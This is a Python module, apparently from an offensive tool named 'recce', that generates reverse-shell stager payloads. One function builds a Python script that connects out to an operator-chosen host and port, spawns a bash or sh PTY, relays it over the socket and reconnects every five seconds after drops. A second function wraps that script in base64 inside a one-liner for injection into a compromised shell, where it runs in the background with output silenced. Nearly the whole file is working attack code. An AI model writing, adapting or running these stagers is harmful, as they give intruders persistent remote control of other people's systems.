"""Stager payloads recce injects/generates. A stager is a *script* (no compiled implant,
no toolchain) that turns a connection into a robust, reconnecting PTY session.

`upgrade_command()` is the auto-pivot: a one-liner pushed into a *raw* caught shell that
detects an available interpreter (pwncat-style — python3/python/python2) and re-execs the
reconnecting-PTY stager, so a weak shell upgrades itself into a robust one with no operator
babysitting. The Windows path uses ConPtyShell (the Windows PTY equivalent) — TODO in a
follow-up; today's auto-pivot targets Unix, which is where raw `/dev/tcp`/nc shells land.
"""
from __future__ import annotations


def python_stager(lhost: str, port: int, token: str) -> str:
    """The reconnecting-PTY stager body for `python -c '<this>'` — full PTY, announces its
    token (NAT-safe re-adoption), auto-reconnects on drop."""
    return (
        'import socket,os,pty,select,time,signal\n'
        f'T="{token}";H="{lhost}";P={port}\n'
        'while 1:\n'
        ' s=None;pid=0\n'
        ' try:\n'
        '  s=socket.socket();s.connect((H,P));s.send(b"RECCE1 "+T.encode()+b"\\n")\n'
        '  pid,fd=pty.fork()\n'
        '  if pid==0:os.execv("/bin/sh",["/bin/sh","-c","exec bash -i 2>/dev/null||exec sh -i"])\n'
        '  while 1:\n'
        '   r=select.select([s,fd],[],[])[0]\n'
        '   if s in r:\n'
        '    d=s.recv(1024)\n'
        '    if not d:break\n'
        '    os.write(fd,d)\n'
        '   if fd in r:\n'
        '    d=os.read(fd,1024)\n'
        '    if not d:break\n'
        '    s.send(d)\n'
        ' except Exception:pass\n'
        ' try:\n'
        '  if pid>0:os.kill(pid,signal.SIGKILL)\n'
        ' except:pass\n'
        ' try:\n'
        '  if s:s.close()\n'
        ' except:pass\n'
        ' time.sleep(5)'
    )


def upgrade_command(lhost: str, port: int, token: str) -> str:
    """A single line to inject into a RAW shell: pick the first available python and background
    the reconnecting-PTY stager. Detection (pwncat-style) tries python3 → python → python2, so
    it works across targets without assuming a specific interpreter."""
    body = python_stager(lhost, port, token)
    # base64 the stager so quoting survives any shell; decode+exec with whichever python exists
    import base64
    b64 = base64.b64encode(body.encode()).decode()
    return (
        "PY=$(command -v python3||command -v python||command -v python2); "
        f'[ -n "$PY" ] && (echo {b64} | base64 -d | "$PY" - >/dev/null 2>&1 &) '
        '&& echo RECCE_UPGRADE_SENT || echo RECCE_NO_PYTHON'
    )
